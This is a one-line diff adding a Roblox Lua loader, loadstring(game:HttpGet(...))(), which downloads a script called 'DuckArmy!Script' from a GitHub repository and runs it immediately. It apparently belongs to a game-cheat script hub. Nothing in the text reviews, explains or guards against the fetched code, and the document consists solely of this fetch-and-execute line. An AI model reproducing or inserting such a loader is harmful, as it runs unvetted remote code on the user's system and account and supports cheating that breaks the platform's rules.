@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EnchantedHub/Enchanted.github.io/refs/heads/main/DuckArmy!Script', true))()
